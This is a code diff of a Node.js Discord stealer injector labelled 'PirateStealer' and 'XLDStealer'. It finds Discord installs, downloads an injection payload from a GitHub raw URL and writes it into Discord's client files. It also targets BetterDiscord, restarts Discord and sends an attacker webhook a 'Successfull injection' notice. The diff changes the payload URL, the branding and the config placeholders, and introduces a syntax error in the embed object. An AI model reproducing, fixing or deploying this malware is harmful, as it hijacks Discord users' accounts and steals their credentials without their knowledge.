@@ -4,17 +4,18 @@ var glob = require("glob");
 const fs = require('fs');
 const https = require('https');
 const { exec } = require('child_process');
+var request = require('sync-request');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
 const webhook = "da_webhook"
 
 const config = {
-    "logout": "%LOGOUT%1",
-    "inject-notify": "%INJECTNOTI%1",
-    "logout-notify": "%LOGOUTNOTI%1",
-    "init-notify":"%INITNOTI%1",
-    "embed-color": %MBEDCOLOR%1,
-    "disable-qr-code": "%DISABLEQRCODE%1"
+    "logout": "%LOGOUT%",
+    "inject-notify": "%INJECTNOTI%",
+    "logout-notify": "%LOGOUTNOTI%",
+    "init-notify":"%INITNOTI%",
+    "embed-color": %MBEDCOLOR%,
+    "disable-qr-code": "%DISABLEQRCODE%"
 }
 
 
@@ -24,8 +25,7 @@ var LOCAL = process.env.LOCALAPPDATA
 var discords = [];
 var injectPath = [];
 var runningDiscords = [];
-
-
+ 
 fs.readdirSync(LOCAL).forEach(file => {
     if (file.includes("iscord")) {
         discords.push(LOCAL + '\\' + file)
@@ -43,7 +43,7 @@ discords.forEach(function(file) {
 });
 listDiscords();
 function Infect() {
-    https.get('https://raw.githubusercontent.com/jimisreallynoobyrn/pirate-stealer-by-bytixo/main/src/Injection/injection', (resp) => {
+    https.get('https://raw.githubusercontent.com/ugur014/ajwdbawjdbawjdbawjdbawjd/main/src/Injection/injection-clean', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
@@ -60,16 +60,13 @@ function Infect() {
                         fs.mkdirSync(init, 0744)
                     }
                 }
-                if ( config.logout != "false" ) {
-
+                if ( config.logout !== "false" ) {
                     let folder = file.replace("index.js", "PirateStealerBTW")
                     if (!fs.existsSync(folder)) {
                         fs.mkdirSync(folder, 0744)
                         if (config.logout == "instant") {
                             startDiscord();
                         }
-                    } else if (fs.existsSync(folder) && config.logout == "instant" ){
-                        startDiscord();
                     }
                 }
             })
@@ -83,7 +80,7 @@ function Infect() {
 
 function listDiscords() {
     exec('tasklist', function(err,stdout, stderr) {
-
+        console.log(stdout)
         
         if (stdout.includes("Discord.exe")) {
 
@@ -127,15 +124,14 @@ function killDiscord() {
     if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
         injectNotify();
     }
-
     Infect()
     pwnBetterDiscord()
 };
 
 function startDiscord() {
     runningDiscords.forEach(disc => {
-        let path = LOCAL + '\\' + disc + "\\Update.exe --processStart " + disc + ".exe"
-        exec(path, (err) => {
+        path = LOCAL + '\\' + disc + "\\Update.exe"
+        exec(`${path} --processStart ${disc}.exe`, (err) => {
             if (err) {
               return;
             }
@@ -159,7 +155,7 @@ function injectNotify() {
     var fields = [];
     injectPath.forEach( path => {
         var c = {
-            name: ":syringe: Inject Path",
+            name: "<:bfdnonsfw:966774651449671761> Inject Path",
             value: `\`\`\`${path}\`\`\``,
             inline: !1
         }
@@ -170,8 +166,8 @@ function injectNotify() {
         "content": null,
         "embeds": [
           {
-            "title": ":detective: Successfull injection",
-            "color": config["embed-color"],
+            "title": "<:bfdnonsfw:966774651449671761> Successfull injection",
+            "color": "#E70000"],
             "fields": fields,
             "author": {
               "name": "XLDStealer"
@@ -189,4 +185,3 @@ function injectNotify() {
     })
 
 }
-
